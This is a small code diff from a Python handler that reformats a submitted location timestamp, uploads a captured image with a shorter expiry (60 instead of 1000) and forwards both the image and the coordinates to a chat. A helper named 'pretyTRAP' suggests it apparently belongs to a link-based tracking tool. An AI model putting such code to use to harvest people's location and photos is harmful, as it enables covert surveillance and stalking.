@@ -68,7 +68,7 @@ async def hello():
             y = greeting.pop("GeoLatitude")
             greeting["GeoTimestamp"] = datetime.datetime.fromtimestamp(int(greeting["GeoTimestamp"])/1000).strftime("%a %h %Y, %r")
             if "img" in greeting.keys():
-                sendImage(url=uploadImage(greeting.pop("img")[31:],expiration=1000), chat_id=chat_id, pesan=pretyTRAP(greeting))
+                sendImage(url=uploadImage(greeting.pop("img")[31:],expiration=60), chat_id=chat_id, pesan=pretyTRAP(greeting))
                 sendMessage(chat_id=chat_id, x=y, y=x)
             else:
                 client.messages.create(
